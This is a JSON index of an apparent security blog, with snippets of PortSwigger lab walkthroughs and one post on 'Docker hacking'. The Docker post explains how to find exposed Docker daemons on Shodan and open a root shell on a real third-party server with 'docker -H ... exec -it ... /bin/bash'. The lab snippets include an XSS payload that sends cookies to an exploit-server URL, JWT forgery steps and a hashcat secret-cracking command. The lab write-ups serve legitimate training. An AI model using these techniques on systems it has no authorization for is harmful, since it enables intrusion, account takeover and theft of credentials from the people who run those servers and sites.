[ { "title": "Docker hacking", "url": "/posts/docker-hacking/", "categories": "docker, shodan, security", "tags": "docker, containers, shodan, security, hacking", "date": "2023-09-19 00:00:00 +0300", "snippet": "Since 2013, Docker has been a game changer in different IT industries in several ways, it gave both developers and users a lot of flexibility for developping and using many apps and operating systems.Firstly, Docker containers provide isolation and portability for software applications. By encapsulating an application and its dependencies within a container, developers can ensure consistent behavior across different environments. This eliminates the notorious “works on my machine” problem and streamlines the deployment process.Secondly, Docker enables the deployment of containers in clusters, managed by frameworks like Google’s Kubernetes. This approach allows for the separation of application code and infrastructure, facilitating highly resilient and elastic architectures. Container clustering is particularly beneficial for microservices-based applications, as it promotes scalability and fault tolerance.Lastly, Docker containers offer a higher layer of abstraction for application deployment. They simplify the process of configuring, saving, and sharing server environments. With Docker, installing an application or large software can be as easy as running a few commands. This ease of use enhances productivity and accelerates development cycles.While Docker has gained significant popularity in recent years, it does introduce some complexity to the development process, but also some weakness if you enable the remote access and use it with default settings. An attacker can then be root in a second, as we’ll see below.Remote access for Docker daemonIf you want to work remotely on a container, it’s possible to configure Docker to accept requests from a remote host as explained on this page from the Docker documention. Even if the documentation explains how to protect Docker by creating a non-root user or protecting the daemon socket for example, a lot of remotely accessible containers are used with the default configuration, accessible on port 2375, but also on port 2376 for TLS using a root account.Find these containers on ShodanBy searching for product:docker port:2375 on Shodan, we can see that many servers hosting containers with the port 2375 open.Because Shodan’s free accounts provide limited results (2 pages), you can increase the number of available results by filtering and specifying alternatively different countries by adding country=XX where XX represents the country code: “country=US” for USA, “country=UK” for United Kingdom, “country=CN” for China, etc… Complete list on iso.org.Analyse the server before attacking (Optional)When you use Docker remotely, you can use the usual options listed on this page. The difference is you need to spocify the host with the “-H” parameter. We will check first the Docker version installed by using the “--version” option on the first server listed on Shodan in the previous section. Then, we can list all images installed and available with the images parameter.Launch the attackFor listing every process actually running, you will use the “ps” parameter. You can see the operating system running on the container, its uptime, size, and espacially its image ID which we will use.Let’s try the first one, running Ubuntu. After docker -H IP_ADDRESS, we can select a container with the “exec” parameter, then add the “-it” options for an interactive shell (“i” for interactive and “t” for tty), and the image ID. Finally, we can write what do we want to use on this container, here “/bin/bash”.After a few seconds, we are root. No credentials, no confirmation, nothing. Just :“Hello that’s me!-OK, please come and do whatever you want”.Now, maybe you’ll need more tools. To install them, you’ll probably need wget, curl or git. On this container, curl is not available, you can install it with: apt install curl -ySame for wget: apt install wget -yThe git command is already available, on this container. If not available you can install it with: apt install git -yYou can now imagine what a malicious attacker can do with all of these, like launching a DDoS attack executed from this container, scanning anonymously any sensitive server and coming back later to download results, creating a phishing attack or clickjacking webpage, etc…If your Docker containers are remotely accessible, please check the security section in the official documentation and make it secure: https://docs.docker.com/engine/security/" }, { "title": "Portswigger writeup - Password reset poisoning via middleware", "url": "/posts/Password-reset-poisoning-via-middleware/", "categories": "writeup, walkthrough, security", "tags": "writeup, walkthrough, portswigger, burp, login, security, password, token", "date": "2022-11-30 00:00:00 +0200", "snippet": "Lab: Password reset poisoning via middlewareTo solve this lab, you have to mix different techniques seen in the previous labs of the same series in order to steal, once again, the cookie of this unfortunate Carlos. On the home page, click “My account Then, click “Forgot password” Enter your username, “wiener” and click “Submit” Access the email client through the exploit server (take the opportunity to keep the exploit server’s URL on a notepad for later) Click the link Enter twice a password (kept “peter” in this example) and click “Submit” In Burp Suite &gt; Proxy &gt; HTTP History, find the POST request “/forgot-password” that contains the username “wiener”, send it to Repeater In Repeater, add the header“X-Forwarded-Host: &lt;your exploit server URL&gt;”, change “wiener” to “carlos” and send it Go back to your email client, copy the link, paste it in a new tab, delete the token and don’t send it for the moment Go back to the exploit server, click “Access logs” Find the GET request for “/forgot-password” that contains the token for “carlos“ Go back to the new open tab (the one opened step 9), add carlos’s token at the end of the URL, where you deleted yours a few steps ago, and send it Enter twice a password (entered “peter” as well for this account) and submit Go to “My account” again Enter Carlos’s new credentials and click “Submit” The lab is solved " }, { "title": "Portswigger writeup - Password reset Broken Logic", "url": "/posts/password-reset-broken-logic/", "categories": "writeup, walkthrough, security", "tags": "writeup, walkthrough, portswigger, burp, login, security, password, token", "date": "2022-11-28 00:00:00 +0200", "snippet": "Lab: Password reset broken logicIn this lab, we’ll bypass the “Forgot password” feature to get access on Carlos’s account. On the home page, click “My account Next page, click “Forgot password” To get Wiener’s email address, click “Email client” In the new open tab, copy Wiener’s email address Go back to the previous tab, paste the email address and click “Submit” Go to the email client and refresh the page, a new email appears. Click the link In the new open page, type and confirm a password and click “Submit” On Burp, in Proxy &gt; HTTP History, find the POST reset that contains twice the “temp-forgot-password-token” (at the top and after “connection close”) and send it to Repeater Delete the 2 tokens and replace “wiener” with “carlos” When it’s done, send the reset, you get a 302 response Go back to the lab and click “My account” Enter Carlos’s credentials (still “peter” in this example, adapt if you have chosen something else) and click “Submit” Carlos’s username and email address appear, the lab is solved " }, { "title": "Portswigger writeup - Offline Password Cracking", "url": "/posts/offline-password-cracking/", "categories": "writeup, walkthrough, security", "tags": "writeup, walkthrough, portswigger, burp, login, security, password, offline", "date": "2022-11-26 00:00:00 +0200", "snippet": "This lab is in the same series than the previous article. The goal here to steal Carlos’s “stay-logged-in” cookie to steal and delete his account.Lab: Offline password cracking Click “My account button” Enter Wiener’s credentials, click “stay-logged-in” option and click “Log in” In Proxy &gt; HTTP History, click the the GET reset “/my-account” and click on the arrow on the “stay-logged-in” cookie The base64 string is decoded: username:passwordO Click “Home” Click a “View post” button In another tab, open the Exploit Server Copy its URL On the post opened at step 6, bottom page, add the following payload (change the URL for your exploit server), as well as random name, email address and website URL. Then click “Post comment”: &lt;script&gt;document.location='https://exploit-server-url.com'+document.cookie&lt;/script&gt; Click “Back to blog” The blog post will be redirected to a similar page (here on Firefox) Go back the the exploit server and click “Access log” A GET reset “/exploitserver” appears in the list, containing a “stay-logged-in” cookie, copy its string Go to base64decode.org, paste the string previously copied to decode it and copy the hashed password, after “carlos:” Go to crackstation.net and paste the hash to get Carlos’s password Go back to the lab’s tab and click multiple times on the “Go back” button until you can see the website without being redirected If needed, click “My account”, according to the point you have reached using the “Go back” button, and click “Log out” Click “My account” again Enter “carlos” as a username and the password previously found at step 16 on Crackstation, “onceuponatime”, and click “Log in” When you are on Carlos’s “My account” page, click “Delete account” Paste one more time his password as a confirmation and click “Delete account!” The lab is solved " }, { "title": "Portswigger writeup - Brute-forcing a stay-logged-in cookie", "url": "/posts/stay-logged-in/", "categories": "writeup, walkthrough, security", "tags": "writeup, walkthrough, portswigger, burp, cookie, bruteforce, login, security", "date": "2022-11-19 00:00:00 +0200", "snippet": "These days I daily work on Web Security Academy, the final goal is becoming a Burp Suite Certified Practitioner. The last lab I was working on is Brute-forcing a stay-logged-in cookie, which is not so difficult but I think that a few details are missing in Portswigger’s solution. So here’s a walkthrough for this lab.Lab: Brute-forcing a stay-logged-in cookie When the lab is open and Burp Suite is ready (Intercept off), Click “My account” Enter Wiener’s credentials, check “Stay logged in” option and click “Log in” When logged in, see the title “My account” and the button “Update email” (useful for later, step 10), and click “Log out” Switch to Burp, in Proxy &gt; HTTP History, find the GET reset for “my-account” page and check its cookies. Click on the arrow for the “stay-looged-in” cookie to see details The decoded string for this cookie is Base64 encoded and contains “username:hash” Copy/paste the hash on CrackStation to verify which algorithm is used (MD5) and its content (Wiener’s password, “peter”). Go back to Burp and send the “my-account” page to Intruder On Positions tab, add a payload position on the “stay-logged-in” parameter On Payloads tab, add the password list provided by Portswigger for this lab, and add the following payload processing: Hash: MD5 Add prefix: carlos Encode: base64-encode On Options tab, in the “Grep - Match” section, click “Clear” first, and add a unique element from the “My account” page. It could be the H1 title “My account” (as in this example below), but it could be as well the “Update email” button. Add one of them in the list and choose same options if different (”Flag results”, “Match type” and “Exclude HTTP headers”) Finally, switch back to Payloads tab and click “Start attack” Wait a couple of seconds, when the attack is over, click the tab where is your “Grep - Match” string (”My account” or “Update email”) to see the valid response (which has a longer length and contains a string in the Payload column) to see its content. Then, when sure, right click on it and click “Send response in browser” Copy the link Paste it in the browser, the lab is solved " }, { "title": "Portswigger writeup - JWT Attacks", "url": "/posts/jwt-attacks/", "categories": "writeup, walkthrough, security", "tags": "writeup, walkthrough, portswigger, burp, jwt, json, security", "date": "2022-06-18 00:00:00 +0300", "snippet": "Since I’ve created this website, I didn’t write a “real” post yet. So, as a first start, I’ll talk about the new labs provided by Portswigger’s Web Security Academy few days ago: JWT Attacks). This is also my very first writeup ever, I hope everything will be clear (Let me know in a private message on Linkedin if you see something wrong, I’ll fix it).As I write this post, I solved only the 3 first labs. The next ones will be added in an update to this post or in a “part 2”, soon.PreparationBefore starting, install the JWT Editor extension on Burp Suite (available for Community and Professional versions), it will be used for all labs.Lab 1: JWT authentication bypass via unverified signature Go to My Account Enter the credentials “wiener” and “peter” From the HTTP History, send the “/my-account” page to repeater Highlight the payload part of the token and go to the “Decoded from” section on the right side Change “wiener” to “administrator” and click on “Apply changes” Send the modified page, if successful the response will be a code 200 Get the link to the response and paste it in the web browser When the admin account is displayed, click on “Admin panel” link Find the “/admin” page in the HTTP History and repeat the previous steps from 3 to 7 When the “Admin panel” is displayed, click on the “delete” link for “carlos” Repeat the same steps again, from 3 to 7 (except the time, the final response will be a 302 and not a 200), for the “/admin/delete?username=carlos” page Go back to the browser, the lab is solved Lab 2: JWT authentication bypass via flawed signature verification Go to My Account From the HTTP History, send the “/my-account” page to Repeater Highlight the Header part of the token and go to the “Decoded from” section on the right side Change “RS256” to “none” and click on “Apply changes” Highlight the Payload part of the token and go to the “Decoded from” section on the right side Change “wiener” to “administrator” and click on “Apply changes” Highlight the Signature of the token and delete it Send the modified reset, if successful, the response will be a code 200 Get the link to the response and paste it in the browser When the admin account is displayed, click on “Admin panel” Find the “/admin” page in the HTTP History and repeat the same steps from 2 to 9 When the Admin panel is displayed, click on the “delete” link for “carlos” Find the “/admin/delete?username=carlos” page in the HTTP History and repeat the same steps from 2 to 9 (The final response will be a code 302, not 200) Go back to the browser, the lab is solved Lab 3: JWT authentication bypass via weak signing key Save this JWT secrets list: https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list Enter the credentials “wiener:peter” Go to “My account” page In the HTTP History, send the page to the Repeater Copy the token Use hashcat to get the secret, using the token copied above and the JWT Secret List downloaded at step 1: hashcat -a 0 -m 16500 &lt;token&gt; &lt;JWT secrets list&gt; Use the upper arrow (↑) the go back to the previous command and add —show at the end to get the secret key (the result will be “secret1”) On jwt.io, paste the token in the “Encoded” section, replace “wiener” with “administrator” and add “secret1” as a secret Copy the new token generated on jwt.io, paste it in the Repeater and send the reset, you’ll get code 200 Get the link to the response and paste it in the browser When the admin account is displayed, go to the “Admin panel” In the HTTP History, find the “/admin” page and send it to the Repeater Repace the JWT token with the one previously generated on jwt.io and send the reset, you’ll get a code 200 Again, get the link to the response and paste it in the browser Finally, click on the “delete” link for “carlos” In the HTTP History, find the “/admin/delete?username=carlos” page and send it to the Repeater Replace the token with the modified previous one (the same previously generated on jwt.io). Send the reset, you’ll get a code 302 Go back to the browser, the lab is solved ———- update july 1st, 2022 ———-Lab 4: JWT authentication bypass via jwk header injection Go to “My account” Enter the credentials “wiener” and “peter” In the HTTP History, find the page “/account” and send it to Repeater Go to the tab JWT Editor Keys on the right side Click on “New RSA Key” Click on “Generate”, the content will appear below, click on “OK” The new RSA key appears in the list Go back to the Repeater, in the JWS section, replace “wiener” with “administrator”, click on “sign” at the bottom window. If you have many keys, select the last one created just before (if you just have one, it’s selected by default) and click on “OK” When it’s done, click on “Attack” and select “Embedded JWK Choose the last key created, if needed and click on “OK” In the Repeater, go back to the “Raw” tab, send the reset (the few last steps has modified the JWT token), you’ll see a response with a code 200 Generate the link for this response Copy this link Paste it on the web browser, you’re now an administrator. Go to the admin panel In the HTTP History, find the page “/admin” and send it to the Repeater Replace the token with the same one used for the previous reset (For simplicity, you can just copy it directly from the previous reset and paste it on this new reset), and get a response with a code 200 Generate the link to this response and copy it Paste it in the web browser, and click on the “delete” link for “carlos” In the HTTP History, find the page “/admin/delete?username=carlos” and repeat the same steps (send to Repeater, paste the same modified token used on steps 11 and 16), you’ll get a code 302 Go back to the web browser, the lab is now solved " }, { "title": "hello world", "url": "/posts/hello/", "categories": "hello", "tags": "hello", "date": "2022-06-11 00:00:00 +0300", "snippet": "Hello world !console.log(alert(\"Hello world !\"))This is just a test with Jekyll on Github.What is it about?This website will be about: Penetration testing Bug bounty hunting CTF" } ]
